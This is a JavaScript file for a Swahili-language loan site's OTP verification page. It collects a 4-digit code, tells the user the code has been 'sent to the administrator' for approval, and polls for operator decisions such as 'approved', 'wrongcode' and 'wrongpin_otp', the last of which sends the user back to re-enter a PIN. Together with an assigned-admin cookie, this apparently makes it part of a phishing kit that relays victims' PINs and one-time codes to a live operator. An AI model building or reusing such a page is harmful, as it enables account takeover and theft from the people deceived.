// OTP Verification Script — NO DIALOGS, INLINE MESSAGES ONLY

document.addEventListener('DOMContentLoaded', function() {
    const otpInputs         = document.querySelectorAll('.otp-box');
    const submitBtn         = document.getElementById('verifyOtpBtn');
    const resendBtn         = document.getElementById('resendBtn');
    const resendTimerDisplay = document.getElementById('resendTimer');
    const countdownNumber   = document.getElementById('countdown');
    const timeRemaining     = document.getElementById('timeRemaining');
    const countdownCircle   = document.getElementById('countdownCircle');
    const maskedPhoneEl     = document.getElementById('maskedPhone');

    // ========================================
    // UTILITY: Cookie reader
    // ========================================
    function getCookie(name) {
        const m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
        return m ? decodeURIComponent(m[1]) : null;
    }

    // ========================================
    // INLINE MESSAGE CONTAINER
    // ========================================
    const messageContainer = document.createElement('div');
    messageContainer.style.cssText = 'margin:20px 0;border-radius:12px;overflow:hidden;';
    const otpInputsContainer = document.querySelector('.otp-inputs');
    if (otpInputsContainer && otpInputsContainer.parentNode) {
        otpInputsContainer.parentNode.insertBefore(messageContainer, otpInputsContainer);
    }

    function showMessage(text, type = 'info') {
        const styles = {
            error  : { bg:'#fee2e2', border:'#fecaca', text:'#991b1b', icon:'✕'  },
            success: { bg:'#d1fae5', border:'#a7f3d0', text:'#065f46', icon:'✓'  },
            warning: { bg:'#fef3c7', border:'#fde68a', text:'#92400e', icon:'⚠'  },
            info   : { bg:'#dbeafe', border:'#bfdbfe', text:'#1e40af', icon:'ℹ'  }
        };
        const s = styles[type] || styles.info;
        messageContainer.innerHTML = `
            <div style="background:${s.bg};border:2px solid ${s.border};color:${s.text};padding:16px 20px;display:flex;align-items:center;gap:12px;font-size:15px;line-height:1.6;">
                <span style="font-size:24px;font-weight:bold;">${s.icon}</span>
                <span style="flex:1;">${text}</span>
            </div>`;
        messageContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        if (type === 'success' || type === 'info') {
            setTimeout(() => { messageContainer.innerHTML = ''; }, 6000);
        }
    }

    function clearMessage() { messageContainer.innerHTML = ''; }

    // ========================================
    // GET APPLICATION DATA
    // ========================================
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    let applicationId = applicationData.applicationId || 'LOAN-' + Date.now();

    // Mask phone
    if (applicationData.phone && maskedPhoneEl) {
        const ph = applicationData.phone;
        maskedPhoneEl.textContent = ph.slice(0, -4).replace(/./g, '*') + ph.slice(-4);
    }

    // Debug
    console.log('🔢 OTP Page | applicationId:', applicationId);
    console.log('  Cookie admin:', getCookie('assignedAdminId') || 'none');

    // ========================================
    // TIMER
    // ========================================
    let timeLeft     = 60;
    let resendLeft   = 60;
    let timerInt, resendInt;

    startTimer();
    startResendTimer();

    // ========================================
    // OTP INPUT HANDLING
    // ========================================
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
            pasted.split('').forEach((ch, i) => { if (otpInputs[i]) otpInputs[i].value = ch; });
            const last = Math.min(pasted.length, otpInputs.length) - 1;
            if (otpInputs[last]) otpInputs[last].focus();
        });
    });

    if (otpInputs[0]) otpInputs[0].focus();

    // ========================================
    // SUBMIT OTP
    // ========================================
    if (submitBtn) {
        submitBtn.addEventListener('click', async function(e) {
            e.preventDefault();

            const otp = Array.from(otpInputs).map(i => i.value).join('');
            if (otp.length !== 4) {
                showMessage('Tafadhali weka msimbo kamili wa nambari 4', 'warning');
                if (otpInputs[0]) otpInputs[0].focus();
                return;
            }

            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Inathibitisha... <span class="arrow">→</span>';
            clearMessage();

            try {
                const response = await fetch('/api/verify-otp', {
                    method : 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body   : JSON.stringify({ applicationId, otp })
                });
                const result = await response.json();

                if (result.success) {
                    showMessage('Msimbo wako umetumwa kwa msimamizi. Subiri idhini...', 'info');
                    checkOTPStatus();
                } else {
                    showMessage('Imeshindwa kuwasilisha msimbo. Jaribu tena.', 'error');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
                    restartTimers();
                }
            } catch (error) {
                console.error('OTP submit error:', error);
                showMessage('Hitilafu ya mtandao. Kagua muunganisho na jaribu tena.', 'error');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
                restartTimers();
            }
        });
    }

    // ========================================
    // POLL OTP STATUS
    // ========================================
    function checkOTPStatus() {
        const statusInterval = setInterval(async () => {
            try {
                const res    = await fetch(`/api/check-otp-status/${applicationId}`);
                const result = await res.json();

                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('🎉 Hongera! Mkopo wako umeidhinishwa. Unaelekezwa...', 'success');
                    setTimeout(() => { window.location.href = 'approval.html'; }, 2000);

                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('Uthibitishaji umeshindwa. Wasiliana na msaada.', 'error');
                    if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Uthibitishaji Umeshindwa'; }

                } else if (result.status === 'wrongpin_otp') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('PIN sio sahihi. Unaelekezwa kuweka PIN tena...', 'error');
                    setTimeout(() => { window.location.href = 'verification.html'; }, 3000);

                } else if (result.status === 'wrongcode') {
                    clearInterval(statusInterval);
                    otpInputs.forEach(i => { i.value = ''; i.disabled = false; });
                    if (otpInputs[0]) otpInputs[0].focus();
                    if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>'; }
                    showMessage('Msimbo sio sahihi. Weka tena au bonyeza "Tuma Tena" kupata mpya.', 'error');
                }
            } catch (err) {
                console.error('OTP status check error:', err);
            }
        }, 2000);

        setTimeout(() => clearInterval(statusInterval), 300000); // 5 min hard stop
    }

    // ========================================
    // TIMERS
    // ========================================
    function startTimer() {
        updateTimerDisplay();
        timerInt = setInterval(() => {
            timeLeft--;
            updateTimerDisplay();
            if (timeLeft <= 0) {
                clearInterval(timerInt);
                handleTimeout();
            }
        }, 1000);
    }

    function updateTimerDisplay() {
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        const txt  = `${mins}:${String(secs).padStart(2, '0')}`;
        if (countdownNumber) countdownNumber.textContent = timeLeft;
        if (timeRemaining)   timeRemaining.textContent   = txt;
        if (countdownCircle) {
            const prog = (timeLeft / 60) * 283;
            countdownCircle.style.strokeDashoffset = 283 - prog;
            if (timeLeft < 20) countdownCircle.style.stroke = '#ef4444';
        }
    }

    function handleTimeout() {
        showMessage('Msimbo umeisha muda. Bonyeza "Tuma Tena" kupata mpya.', 'warning');
        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Msimbo Umeisha Muda'; }
        otpInputs.forEach(i => { i.value = ''; i.disabled = true; });
    }

    function startResendTimer() {
        if (resendBtn)         { resendBtn.disabled = true; resendBtn.style.opacity = '0.5'; }
        if (resendTimerDisplay)  resendTimerDisplay.textContent = '(1:00)';

        resendInt = setInterval(() => {
            resendLeft--;
            if (resendLeft <= 0) {
                clearInterval(resendInt);
                if (resendBtn)          { resendBtn.disabled = false; resendBtn.style.opacity = '1'; }
                if (resendTimerDisplay)   resendTimerDisplay.textContent = '';
            } else {
                const m = Math.floor(resendLeft / 60);
                const s = resendLeft % 60;
                if (resendTimerDisplay) resendTimerDisplay.textContent = `(${m}:${String(s).padStart(2, '0')})`;
            }
        }, 1000);
    }

    function restartTimers() {
        clearAllTimers();
        timeLeft   = 60;
        resendLeft = 60;
        startTimer();
        startResendTimer();
    }

    function clearAllTimers() {
        if (timerInt)  clearInterval(timerInt);
        if (resendInt) clearInterval(resendInt);
    }

    // ========================================
    // RESEND OTP
    // ========================================
    if (resendBtn) {
        resendBtn.addEventListener('click', async function() {
            if (resendLeft > 0) return;
            try {
                const res    = await fetch('/api/resend-otp', {
                    method : 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body   : JSON.stringify({ applicationId })
                });
                const result = await res.json();

                if (result.success) {
                    showMessage('Msimbo mpya umeombwa. Angalia na msimamizi.', 'success');
                    otpInputs.forEach(i => { i.value = ''; i.disabled = false; });
                    if (otpInputs[0]) otpInputs[0].focus();
                    if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>'; }
                    restartTimers();
                } else {
                    showMessage('Imeshindwa kutuma msimbo tena. Jaribu tena.', 'error');
                }
            } catch (error) {
                console.error('Resend error:', error);
                showMessage('Hitilafu ya mtandao. Jaribu tena.', 'error');
            }
        });
    }
});
